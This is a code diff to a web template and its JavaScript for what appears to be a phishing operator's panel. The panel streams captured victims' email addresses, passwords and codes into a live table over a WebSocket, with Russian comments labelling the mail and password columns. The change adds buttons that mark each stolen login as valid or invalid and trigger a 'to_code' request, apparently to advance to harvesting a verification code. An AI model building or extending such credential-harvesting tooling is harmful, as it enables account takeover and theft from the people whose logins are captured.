@@ -136,7 +136,13 @@
 <td id="{{log['id']}}-code">{{log['code']}}</td>
 <td>{{log['mail']}}</td>
 <td>{{log['password']}}</td>
-<td style=""><a href="#" class="status_btn">Active</a></td>
+
+<td style="">
+<a href="#" class="status_btn" id="{{log['id']}}" onclick="to_code(this.id, 'valid')">Valid</a>
+<a href="#" class="status_btn" id="{{log['id']}}" onclick="to_code(this.id, 'invalid')">Not valid</a>
+</td>
+
+
 </tr>
 
 {% end %}
@@ -179,6 +185,21 @@
 
 <script type="text/javascript">
 	
+
+function to_code(log_id, type) {
+$.ajax({
+type: 'get',
+url: '/logs-handler',
+dataType: 'html',
+data: {type: 'to_code', log_id: log_id, log_type: type},
+})
+}
+
+
+</script>
+
+<script type="text/javascript">
+	
 	//uri = 'ws://212.113.106.67:8000/live-logs'
 	uri = 'ws://127.0.0.1:8888/live-logs'
 	let  ws = new WebSocket(uri);
@@ -208,7 +229,11 @@
 							col5 = $(`<td id="${item.id}-code">${item.code}</td>`)
 							col2 = $(`<td><!-- ПОЧТА -->${item.mail}</td>`)
 							col3 = $(`<td><!-- ПАРОЛЬ --> ${item.password}</td>`)
-							col4 = $(`<td style=""><a href="#" class="status_btn">Active</a></td>`)
+							col4 = $(`<td style="">
+<a href="#" class="status_btn" id="${item.id}" onclick="to_code(${item.id}, 'valid')">Valid</a>
+<a href="#" class="status_btn" id="${item.id}" onclick="to_code(${item.id}, 'invalid')">Not valid</a>
+</td>
+`)
 
 							row.append(col1, col5, col2, col3, col4).prependTo('#table')
 							sound()
@@ -224,7 +249,10 @@
 			col5 = $(`<td id="${item.id}-code">${item.code}</td>`)
 			col2 = $(`<td><!-- ПОЧТА -->${item.mail}</td>`)
 			col3 = $(`<td><!-- ПАРОЛЬ --> ${item.password}</td>`)
-			col4 = $(`<td style=""><a href="#" class="status_btn">Active</a></td>`)
+			col4 = $(`<td style="">
+<a href="#" class="status_btn" id="${item.id}" onclick="to_code(${item.id}, 'valid')">Valid</a>
+<a href="#" class="status_btn" id="${item.id}" onclick="to_code(${item.id}, 'invalid')">Not valid</a>
+</td>`)
 			sound()
 			row.append(col1, col5, col2, col3, col4).prependTo('#table')
 		})
